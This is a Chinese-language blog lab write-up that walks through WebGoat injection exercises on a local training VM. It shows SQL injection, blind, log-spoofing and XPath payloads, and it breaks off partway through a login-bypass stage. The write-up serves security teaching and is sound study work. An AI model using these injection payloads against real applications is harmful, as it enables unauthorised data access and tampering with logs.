<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
  </script>

  <meta name="description" content="实验目的 安装和配置WebGoat与WebScarab； 使用WebGoat，根据提示信息，完成包括Injection Flaw大类下的String SQL注入，Numeric SQL注入，Log Spoofing，XPATH Injection等安全弱点的攻击测试。">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入实验">
<meta property="og:url" content="https://leeyuxun.github.io/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C.html">
<meta property="og:site_name" content="Leeyuxun の note">
<meta property="og:description" content="实验目的 安装和配置WebGoat与WebScarab； 使用WebGoat，根据提示信息，完成包括Injection Flaw大类下的String SQL注入，Numeric SQL注入，Log Spoofing，XPATH Injection等安全弱点的攻击测试。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859620286.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859645909.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859672911.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859727470.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859743879.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859750160.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859930271.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860072183.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860083941.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860227911.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860232723.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860258781.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860336407.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860390596.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860424728.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860517736.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860549367.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860682841.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860769818.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860799195.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860881715.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860912207.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861012855.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861154130.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861244754.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861365764.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861388823.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861415462.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861522793.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861561587.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861581845.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861666493.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861755893.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861777502.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861836101.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861901321.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861980984.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861986023.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862043052.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862076676.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862098254.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862121610.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862152256.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862157243.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862174858.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862222733.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862284087.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862325209.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862367139.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862400235.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862422877.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863222560.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863258617.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863306258.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863334915.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863362085.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862043052.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862650413.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862664106.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862750086.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862761063.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862837386.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862843842.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862931713.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862940712.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863006027.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863010978.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863074071.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863222560.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863427938.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863433020.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863487711.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863498957.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863540630.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863544746.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863584752.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863588715.png">
<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863634151.png">
<meta property="article:published_time" content="2019-08-15T08:42:09.000Z">
<meta property="article:modified_time" content="2020-04-02T06:35:52.000Z">
<meta property="article:author" content="李钰璕">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859620286.png">

<link rel="canonical" href="https://leeyuxun.github.io/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>SQL注入实验 | Leeyuxun の note</title>
  
    <script>
      function sendPageView() {
        if (CONFIG.hostname !== location.hostname) return;
        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
        localStorage.setItem('uid', uid);
        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
          v  : 1,
          tid: 'UA-163555158-1',
          cid: uid,
          t  : 'pageview',
          dp : encodeURIComponent(location.pathname)
        }));
      }
      document.addEventListener('pjax:complete', sendPageView);
      sendPageView();
    </script>






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Leeyuxun の note</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="李钰璕">
      <meta itemprop="description" content="安全学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leeyuxun の note">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SQL注入实验
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-15 16:42:09" itemprop="dateCreated datePublished" datetime="2019-08-15T16:42:09+08:00">2019-08-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-04-02 14:35:52" itemprop="dateModified" datetime="2020-04-02T14:35:52+08:00">2020-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">软件安全实验</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>安装和配置<code>WebGoat</code>与<code>WebScarab</code>；</li>
<li>使用<code>WebGoat</code>，根据提示信息，完成包括<code>Injection Flaw</code>大类下的<code>String SQL</code>注入，<code>Numeric SQL</code>注入，<code>Log Spoofing</code>，<code>XPATH Injection</code>等安全弱点的攻击测试。<span id="more"></span></li>
</ol>
<h1 id="安装和配置WebGoat与WebScarab"><a href="#安装和配置WebGoat与WebScarab" class="headerlink" title="安装和配置WebGoat与WebScarab"></a>安装和配置<code>WebGoat</code>与<code>WebScarab</code></h1><ol>
<li><p>用于测试的主机已经配置完成<code>JAVA</code>环境，在使用<code>WebScarab</code>时只需要在<code>webscarab-selfcontained-20070504-1631.jar</code>文件所在的目录调出命令行，输入</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar webscarab-selfcontained-20070504-1631.jar</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859620286.png" alt="1565859620286"></p>
</li>
<li><p>使用<code>Vmware</code>安装一个<code>ubuntu</code>虚拟机，镜像选择<code>GameOver.0.1.null.iso</code>，该镜像已经配置好<code>WebGoat</code>环境</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859645909.png" alt="1565859645909"></p>
</li>
<li><p>安装完成后，输入命令行：<code>ifconfig</code>，查看IP地址为<code>192.168.88.149</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859672911.png" alt="1565859672911"></p>
</li>
<li><p>访问URL：<code>http://192.168.88.149:8080/WebGoat/attack</code>，输入用户名<code>guest</code>和密码<code>guest</code>，显示如下页面说明安装成功，点击<code>start WebGoat</code>，然后点击<code>injection flaws</code>进行攻击测试</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859727470.png" alt="1565859727470"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859743879.png" alt="1565859743879"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859750160.png" alt="1565859750160"></p>
</li>
</ol>
<h1 id="String-SQL注入"><a href="#String-SQL注入" class="headerlink" title="String SQL注入"></a><code>String SQL</code>注入</h1><ol>
<li><p>在左侧菜单中找到<code>string SQL injection</code>并单击，在输入框中输入字符串<code>Levi</code>，显示没有结果匹配，同时显示出查找语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_data <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Levi&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>根据该查找语句，输入<code>‘ or 1=1 --</code>，构造语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_data <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>--</code>是数据库语言中的注释字符，它的作用是将最后一个单引号变为无效字符，查询语言等同于：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_data</span><br></pre></td></tr></table></figure>

<p>结果显示user_data中所有的数据</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859930271.png" alt="1565859930271"></p>
</li>
</ol>
<h1 id="Numeric-SQL注入"><a href="#Numeric-SQL注入" class="headerlink" title="Numeric SQL注入"></a><code>Numeric SQL</code>注入</h1><ol>
<li><p>在左侧菜单中找到<code>string SQL injection</code>并单击，页面中有一个下拉框，点击<code>GO！</code>按钮可以得到查询结果如图所示，同时显示出查找语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> weather_data <span class="keyword">WHERE</span> station <span class="operator">=</span> <span class="number">101</span></span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860072183.png" alt="1565860072183"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860083941.png" alt="1565860083941"></p>
</li>
<li><p>因为页面中的输入项变成了下拉框，所以没法直接构造查询字符串， 之前的<code>String SQL</code>注入在这里无法完成，需要借助<code>WebScarab</code>代理工具来完成<code>SQL</code>注入攻击，使用之前配置的<code>JAVA</code>环境，在<code>webscarab-selfcontained-20070504-1631.jar</code>所在的目录打开命令行，并输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar webscarab-selfcontained-20070504-1631.jar</span><br></pre></td></tr></table></figure>

<p>打开<code>WebScarab</code>，在<code>Intercept</code>标签中选定<code>Intercept Request</code>，并在<code>Methods</code>中选定<code>POST</code>方法</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860227911.png" alt="1565860227911"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860232723.png" alt="1565860232723"></p>
</li>
<li><p>将使用的火狐浏览器设置为手动代理，地址为<code>127.0.0.1</code>，端口为<code>8008</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860258781.png" alt="1565860258781"></p>
</li>
<li><p>在网页上继续点击<code>GO!</code> ，这时<code>WebScarab</code>会弹出<code>Edit Request</code>窗口，代理设置生效，浏览器的请求经过代理转发。<code>URLEncoded</code>栏中可以看到<code>Request</code>中传递的参数，其中<code>station</code>就是下拉选框的参数，可以看到其值为<code>101</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860336407.png" alt="1565860336407"></p>
</li>
<li><p>将该参数修改为<code>101 or 1=1</code>，构造语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> weather_data <span class="keyword">WHERE</span> station <span class="operator">=</span> <span class="number">101</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>查询语言等同于：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> weather_data</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860390596.png" alt="1565860390596"></p>
</li>
<li><p>点击<code>Accept changes</code>按钮提交<code>Request</code>请求，数据库中所有数据内容都显示在页面上</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860424728.png" alt="1565860424728"></p>
</li>
</ol>
<h1 id="Blind-SQL注入"><a href="#Blind-SQL注入" class="headerlink" title="Blind SQL注入"></a><code>Blind SQL</code>注入</h1><ol>
<li><p>在左侧菜单中找到<code>Blind SQL injection</code>并单击，跳转到<code>Blind SQL injection</code>页面，根据提示需要盲注以找到正确的<code>first_name</code> (由大小写字母构成)，更改输入框内容，发现只有<code>101</code>是合法的</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860517736.png" alt="1565860517736"></p>
</li>
<li><p>将使用的火狐浏览器设置为同上的手动代理，启动<code>WebScarab</code>，在网页上点击<code>GO!</code> ，这时<code>WebScarab</code>会弹出<code>Edit Request</code>窗口，代理设置生效，浏览器的请求经过代理转发</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860549367.png" alt="1565860549367"></p>
</li>
<li><p>使用盲注工具<code>JHijack</code>进行盲注，设置<code>HijackData</code>为<code>Numeric</code>，范围为<code>65-122</code>(大小写字母<code>ASCII码</code>范围)，<code>Host</code>设置为该网站的IP地址<code>192.168.88.149</code>，<code>Port</code>设置为<code>8080</code>，URL设置为<code>/WebGoat/attack?Screen=163&amp;menu=1200</code>，方法改为<code>POST</code>，<code>Grep</code>设置为<code>Account number is valid</code>，<code>SESS ID</code>设置为上图中的<code>Cookie</code>内容<code>JSESSIONID=A734E5274D7A7D5D84E2D529D5D3146</code><br><code>4</code>，<code>Hijack Type</code>设置为<code>BODY</code>，<code>Hijack ID</code>设置为<code>account_number=101 AND (SELECT ASCII(SUBSTR(first_name,1,1)) FROM user_data WHERE userid = 15613 ) =$ --</code>，点击<code>Hijack</code>按钮，进行第一个字符的盲注，结果得到第一个字符的<code>ASCII码</code>为<code>74</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860682841.png" alt="1565860682841"></p>
</li>
<li><p>将<code>Hijack ID</code>里面的<code>(first_name,1,1)</code>更改为<code>(first_name,2,1)</code>，点击<code>Hijack</code>，获取第二个字符的<code>ASCII码</code>为<code>111</code>，以此类推，直至到七个字符时，并未获得结果，说明，<code>first_name</code>由六个字符构成，将<code>ASCII码</code>转换成字母为：**<code>Joesph</code>**</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860769818.png" alt="1565860769818"></p>
</li>
<li><p>将正确的<code>first_name：Joseph</code>输入到输入框点击<code>GO!</code> ，注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860799195.png" alt="1565860799195"></p>
</li>
</ol>
<h1 id="Log-Spoofing-日志欺骗"><a href="#Log-Spoofing-日志欺骗" class="headerlink" title="Log Spoofing(日志欺骗)"></a><code>Log Spoofing</code>(日志欺骗)</h1><ol>
<li><p>在左侧菜单中找到<code>Log Spoofing</code>并单击，页面中出现两个输入框，在<code>username</code>输入框输入<code>1‘ or 1=1 --</code>，点击<code>login</code>，查询失败，同时显示：<code>Login failed for username: 1&#39; or 1=1 --</code>，很明显，显示的内容是<code>Web</code>服务器的日志中的记录的内容</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860881715.png" alt="1565860881715"></p>
</li>
<li><p>在输入框中输入<code>1 Login Succeeded for username :</code><br><code>admin</code>，会显示<code>Login failed for username: 1 Login Succeeded for username : admin</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860912207.png" alt="1565860912207"></p>
</li>
<li><p>利用换行符<code>%0A</code>将输入内容在<code>Login</code>前面分成两行，即在输入框输入：<code>1%0d%0aLogin Succeeded for username:admin</code>，尝试欺骗管理员，点击<code>Login</code>后在日志中显示成功使用户名<code>admin</code>登录，登录日志为<br><code>Login failed for username: 1</code><br><code>Login Succeeded for username:admin</code></p>
<p>(注意：在换行的时候要使用换行符<code>%0A</code>，如果使用回车符<code>%0D</code>则只能显示登录日志，不显示攻击成功)</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861012855.png" alt="1565861012855"></p>
</li>
</ol>
<h1 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a><code>XPATH</code>注入</h1><ol>
<li><p>在左侧菜单中找到<code>XPATH Injection</code>并单击，页面中出现两个输入框，根据提示在<code>username</code>输入框输入<code>Levi</code>，在<code>username</code>输入框输入<code>test123</code>，点击<code>submit</code>，网页显示<code>Mike</code>的相关信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861154130.png" alt="1565861154130"></p>
</li>
<li><p>在用户名处输入<code>&#39; or 1=1 or &#39;a&#39; = &#39;a</code>,密码任意输入，这样服务器解析后的结果为<code>expression = &quot;/employees/employee[ (loginID/text() = &#39; or 1=1 ) OR ( &#39;a&#39; = &#39;a&#39; and passwd/text () = &#39;password&#39; )]&quot;</code> ，结果显示所有人的信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861244754.png" alt="1565861244754"></p>
</li>
</ol>
<h1 id="LAB-SQL-Injection"><a href="#LAB-SQL-Injection" class="headerlink" title="LAB:SQL Injection"></a><code>LAB:SQL Injection</code></h1><ol>
<li><p>在左侧菜单中找到<code>string SQL injection</code>中的<code>Stage 1: String SQL Injection</code>并单击，根据网页提示，需要以<code>boss</code>的用户名<code>Neville</code>进行绕过密码登录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861365764.png" alt="1565861365764"></p>
</li>
<li><p>尝试在密码输入栏输入：<code>‘ or 1=1 --</code>，点击<code>Login</code>后显示登录失败</p>
